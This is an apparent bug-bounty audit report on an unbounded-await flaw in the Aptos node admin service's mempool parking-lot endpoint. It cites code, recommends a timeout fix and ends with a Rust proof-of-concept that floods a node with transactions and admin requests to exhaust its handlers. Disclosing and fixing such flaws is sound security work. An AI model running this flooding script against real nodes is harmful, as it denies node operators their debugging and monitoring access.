# Audit Report

## Title
Admin Service Parking Lot Endpoint Vulnerable to Resource Exhaustion via Unbounded Blocking on Mempool Coordinator

## Summary
The admin service endpoint `/debug/mempool/parking-lot/addresses` lacks timeout protection on its internal communication channel, allowing an attacker to tie up HTTP worker threads indefinitely when the mempool coordinator is slow to respond, leading to admin service unresponsiveness.

## Finding Description

The `mempool_handle_parking_lot_address_request()` function communicates with the mempool coordinator via a oneshot channel but awaits the response without any timeout protection. [1](#0-0) 

The critical vulnerability occurs because the HTTP handler blocks on `receiver.await` at line 49 with no timeout. The response depends on the mempool coordinator processing the request, which operates as a single-threaded event loop that awaits on spawning tasks to a bounded executor with limited capacity (4 workers by default, 16 for VFNs). [2](#0-1) [3](#0-2) 

When processing client requests, the coordinator awaits on the bounded executor's `spawn()` method, which blocks asynchronously until a worker permit is available: [4](#0-3) [5](#0-4) 

The bounded executor is shared among all mempool client requests (transaction submissions, transaction queries, parking lot queries) and network broadcast events. When saturated with slow operations like transaction validation (which performs database reads and VM validation), the coordinator blocks waiting for permits, causing admin service HTTP handlers to wait indefinitely. [6](#0-5) 

**Attack Path:**
1. Attacker floods the node with transaction submissions via the API, saturating the bounded executor's 4 workers with validation tasks
2. Attacker sends multiple concurrent requests to `/debug/mempool/parking-lot/addresses`
3. The `try_send()` succeeds (channel capacity is 1024), queuing requests to the coordinator
4. The coordinator attempts to process requests but blocks on `bounded_executor.spawn()` waiting for available workers
5. Admin service HTTP handlers block on `receiver.await` with no timeout
6. As more admin requests arrive, additional HTTP worker threads become blocked
7. Eventually, the admin service runtime exhausts its capacity to handle new connections, making it unresponsive to legitimate admin operations

## Impact Explanation

This vulnerability achieves **High Severity** classification under the Aptos bug bounty criteria as it causes "Validator node slowdowns" and effectively crashes the admin API. While the admin service is not critical for consensus or transaction processing, it is essential for node operators to:
- Debug mempool issues
- Monitor node health
- Access consensus database information
- Profile node performance

An unresponsive admin service significantly impairs operational capabilities during incidents, potentially delaying critical responses to node problems. The attack requires no special privileges and can be executed by any external actor with network access to the admin service port.

## Likelihood Explanation

**Likelihood: High**

The attack is highly feasible because:
1. The admin service has no connection limits or timeouts configured at the application level
2. The bounded executor has very limited capacity (4 workers) that is shared across multiple request types
3. Transaction validation operations are inherently slow (database reads, VM validation)
4. The coordinator processes events sequentially, creating a bottleneck
5. No authentication is required by default (except on mainnet) [7](#0-6) 

An attacker can easily craft this attack by:
- Sending transaction submissions to saturate the bounded executor
- Simultaneously sending HTTP requests to the admin parking lot endpoint
- Maintaining pressure until the admin service becomes unresponsive

## Recommendation

Implement timeout protection for all admin service mempool client requests. Add a configurable timeout (e.g., 5-10 seconds) using `tokio::time::timeout`:

```rust
async fn get_parking_lot_addresses(
    mempool_client_sender: MempoolClientSender,
) -> Result<Vec<(AccountAddress, u64)>, Canceled> {
    let (sender, receiver) = futures_channel::oneshot::channel();

    match mempool_client_sender
        .clone()
        .try_send(MempoolClientRequest::GetAddressesFromParkingLot(sender))
    {
        Ok(_) => {
            // Add timeout protection
            match tokio::time::timeout(
                Duration::from_secs(5),
                receiver
            ).await {
                Ok(result) => result,
                Err(_) => {
                    info!("Timeout waiting for parking lot addresses response");
                    Err(Canceled)
                }
            }
        },
        Err(e) => {
            info!("Failed to send request for GetAddressesFromParkingLot: {e:?}");
            Err(Canceled)
        },
    }
}
```

Additionally, consider:
1. Adding HTTP-level timeouts to the Hyper server configuration in the admin service
2. Implementing connection limits on the admin service HTTP runtime
3. Using `try_spawn` instead of `spawn` in the coordinator to fail fast when the executor is saturated
4. Increasing the bounded executor capacity or creating a separate executor for admin requests

## Proof of Concept

```rust
// Reproduction steps:
// 1. Deploy an Aptos node with admin service enabled
// 2. Run the following attack script

use tokio;
use reqwest;

#[tokio::main]
async fn main() {
    let admin_url = "http://localhost:9102/debug/mempool/parking-lot/addresses";
    let api_url = "http://localhost:8080/v1/transactions";
    
    // Step 1: Saturate the bounded executor with transaction submissions
    let submit_tasks: Vec<_> = (0..100).map(|_| {
        tokio::spawn(async move {
            loop {
                // Submit transactions to fill the bounded executor
                let _ = reqwest::Client::new()
                    .post(api_url)
                    .json(&create_dummy_transaction())
                    .send()
                    .await;
                tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            }
        })
    }).collect();
    
    // Step 2: Flood admin service with parking lot requests
    let admin_tasks: Vec<_> = (0..50).map(|i| {
        tokio::spawn(async move {
            println!("Admin request {} starting...", i);
            match tokio::time::timeout(
                std::time::Duration::from_secs(30),
                reqwest::get(admin_url)
            ).await {
                Ok(Ok(resp)) => println!("Admin request {} completed: {:?}", i, resp.status()),
                Ok(Err(e)) => println!("Admin request {} failed: {:?}", i, e),
                Err(_) => println!("Admin request {} timed out after 30s", i),
            }
        })
    }).collect();
    
    // Wait and observe: admin requests will block waiting for coordinator
    for task in admin_tasks {
        let _ = task.await;
    }
    
    // Expected: Most admin requests will timeout, demonstrating the vulnerability
}

fn create_dummy_transaction() -> serde_json::Value {
    // Create a valid transaction payload
    serde_json::json!({
        // Transaction details
    })
}
```

**Notes**

The vulnerability exists at the application code level regardless of deployment configuration. While HAProxy may provide some timeout protection when deployed, the core issue remains: the admin service lacks defensive timeout mechanisms for internal communication with the mempool coordinator. This violates defensive programming principles and creates operational risk for node operators who may access the admin service directly or in non-HAProxy deployment scenarios.

### Citations

**File:** crates/aptos-admin-service/src/server/mempool/mod.rs (L40-55)
```rust
async fn get_parking_lot_addresses(
    mempool_client_sender: MempoolClientSender,
) -> Result<Vec<(AccountAddress, u64)>, Canceled> {
    let (sender, receiver) = futures_channel::oneshot::channel();

    match mempool_client_sender
        .clone()
        .try_send(MempoolClientRequest::GetAddressesFromParkingLot(sender))
    {
        Ok(_) => receiver.await,
        Err(e) => {
            info!("Failed to send request for GetAddressesFromParkingLot: {e:?}");
            Err(Canceled)
        },
    }
}
```

**File:** config/src/config/mempool_config.rs (L116-116)
```rust
            shared_mempool_max_concurrent_inbound_syncs: 4,
```

**File:** mempool/src/shared_mempool/coordinator.rs (L92-92)
```rust
    let workers_available = smp.config.shared_mempool_max_concurrent_inbound_syncs;
```

**File:** mempool/src/shared_mempool/coordinator.rs (L109-111)
```rust
            msg = client_events.select_next_some() => {
                handle_client_request(&mut smp, &bounded_executor, msg).await;
            },
```

**File:** mempool/src/shared_mempool/coordinator.rs (L219-223)
```rust
        MempoolClientRequest::GetAddressesFromParkingLot(callback) => {
            bounded_executor
                .spawn(tasks::process_parking_lot_addresses(smp.clone(), callback))
                .await;
        },
```

**File:** crates/bounded-executor/src/executor.rs (L41-52)
```rust
    /// Spawn a [`Future`] on the `BoundedExecutor`. This function is async and
    /// will block if the executor is at capacity until one of the other spawned
    /// futures completes. This function returns a [`JoinHandle`] that the caller
    /// can `.await` on for the results of the [`Future`].
    pub async fn spawn<F>(&self, future: F) -> JoinHandle<F::Output>
    where
        F: Future + Send + 'static,
        F::Output: Send + 'static,
    {
        let permit = self.acquire_permit().await;
        self.executor.spawn(future_with_permit(future, permit))
    }
```

**File:** config/src/config/admin_service_config.rs (L41-50)
```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "0.0.0.0".to_string(),
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
```
